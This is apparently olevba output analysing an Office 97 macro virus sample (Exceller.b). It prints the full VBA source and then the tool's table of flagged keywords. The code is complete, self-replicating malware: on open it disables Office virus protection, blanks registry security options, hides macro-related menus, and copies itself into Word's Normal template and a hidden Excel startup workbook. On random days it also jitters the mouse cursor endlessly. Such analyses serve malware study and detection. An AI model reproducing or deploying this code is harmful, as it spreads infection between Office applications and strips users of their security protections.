olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Exceller.b-cb19fae15718c410a95861df49372bbeb3df322e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Exceller.b-cb19fae15718c410a95861df49372bbeb3df322e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cross.bas 
in file: Virus.MSOffice.Exceller.b-cb19fae15718c410a95861df49372bbeb3df322e - OLE stream: 'Macros/VBA/Cross'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Const ModulName = "Cross"

Public Declare Function SetCursorPos Lib "user32" _
    (ByVal x As Long, ByVal y As Long) As Long

Public Declare Function GetCursorPos Lib "user32" _
    (lpPoint As Maus) As Long

Public Declare Sub Sleep Lib "kernel32" _
    (ByVal dwMilliseconds As Long)

Private Type Maus
       Xpos As Long
       Ypos As Long
End Type


Sub AutoOpen()
On Error Resume Next

Options.VirusProtection = False
Options.SaveNormalPrompt = False

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""

CommandBars("View").Controls(6).Enabled = False
CommandBars("Format").Controls(12).Enabled = False
CommandBars("Tools").Controls(12).Enabled = False
CommandBars("Tools").Controls(13).Enabled = False
CommandBars("Tools").Controls(14).Enabled = False

Application.DisplayAlerts = wdAlertsNone

Application.VBE.ActiveVBProject.VBComponents(ModulName).Export "c:\cross.sys"

Set Normal_ = NormalTemplate.VBProject.VBComponents
Set Active_ = ActiveDocument.VBProject.VBComponents

For i = 1 To Normal_.Count
    If Normal_(i).Name = ModulName Then NormalIns = True
Next i

For j = 1 To Active_.Count
    If Active_(j).Name = ModulName Then ActiveIns = True
Next j

If NormalIns = False Then
    Normal_.Import "c:\cross.sys"
End If

If ActiveIns = False Then
    Active_.Import "c:\cross.sys"
    ActiveDocument.SaveAs ActiveDocument.FullName
End If

With Application.FileSearch
    .LookIn = Application.Path
    .FileName = "Workbook_.xls"
    .SearchSubFolders = True
    .Execute
If .FoundFiles.Count <> 0 Then ExcelInstalled = True
End With
    
If ExcelInstalled = False Then

    Set Excelx = CreateObject("excel.application")
    Excelx.Visible = False
    
    Excelx.CommandBars("Tools").Controls(10).Enabled = False
    Excelx.CommandBars("Tools").Controls(12).Enabled = False
    Excelx.CommandBars("View").Controls(3).Enabled = False
    Excelx.CommandBars("Window").Controls(3).Enabled = False
    Excelx.CommandBars("Window").Controls(4).Enabled = False

    Book = Excelx.Application.StartupPath & "\Workbook_.xls"
    
    Set Workbookx = Excelx.Workbooks.Add
    
    Workbookx.VBProject.VBComponents.Import "c:\cross.sys"
    Excelx.ActiveWindow.Visible = False
    Workbookx.SaveAs Book

    Excelx.Quit

End If
If Day(Now()) = Int(Rnd * 31) Then mEarthquake
End Sub

Sub Auto_Open()
Application.OnSheetActivate = "Exceler"
End Sub

Sub Exceler()
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents(ModulName).Export "c:\cross.sys"

With Application
.DisplayAlerts = False
.ScreenUpdating = False

.CommandBars("Tools").Controls(10).Enabled = False
.CommandBars("Tools").Controls(12).Enabled = False
.CommandBars("View").Controls(3).Enabled = False
.CommandBars("Window").Controls(3).Enabled = False
.CommandBars("Window").Controls(4).Enabled = False
End With

Set Active_ = ActiveWorkbook.VBProject.VBComponents
Book = Application.StartupPath & "\Workbook_.xls"

If UCase(Dir(Book)) <> "WORKBOOK_.XLS" Then
    Workbooks.Add.SaveAs FileName:=Book, AddToMru:=False
    Workbooks("Workbook_.xls").VBProject.VBComponents.Import "c:\cross.sys"
    ActiveWindow.Visible = False
    Workbooks("Workbook_.xls").Save
End If

For i = 1 To Active_.Count
    If Active_(i).Name = ModulName Then Installed = True
Next

If Installed = False Then
    Active_.Import "c:\cross.sys"
    ActiveWorkbook.SaveAs FileName:=ActiveWorkbook.FullName, AddToMru:=False
End If

Set Wordx = CreateObject("word.application")

    Wordx.Visible = False
    Set WordTemp = Wordx.NormalTemplate.VBProject.VBComponents
    
    For j = 1 To WordTemp.Count
        If WordTemp(j).Name = ModulName Then WordIns = True
    Next
   
    If WordIns = False Then
    
        WordTemp.Import "c:\cross.sys"
 
        Wordx.Options.VirusProtection = False
        Wordx.Options.SaveNormalPrompt = False
    
        Wordx.CommandBars("View").Controls(6).Enabled = False
        Wordx.CommandBars("Format").Controls(12).Enabled = False
        Wordx.CommandBars("Tools").Controls(12).Enabled = False
        Wordx.CommandBars("Tools").Controls(13).Enabled = False
        Wordx.CommandBars("Tools").Controls(14).Enabled = False

        Wordx.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
        Wordx.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
      
    End If

Wordx.Quit
If Day(Now()) = Int(Rnd * 31) Then mEarthquake
End Sub

Sub mEarthquake()

Dim posMaus As Maus
Dim newX As Long, newY As Long
Application.Caption = "Office97Macro.Crossworkx...it's time for an earthquake!"

Do
    GetCursorPos posMaus
                 
     newX = Rnd(2)
     If newX = 0 Then newX = -5 Else newX = 5
     
     newY = Rnd(2)
     If newY = 0 Then newY = -5 Else newY = 5
           
     SetCursorPos posMaus.Xpos + newX, posMaus.Ypos + newY
     Sleep 2

     DoEvents
Loop

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

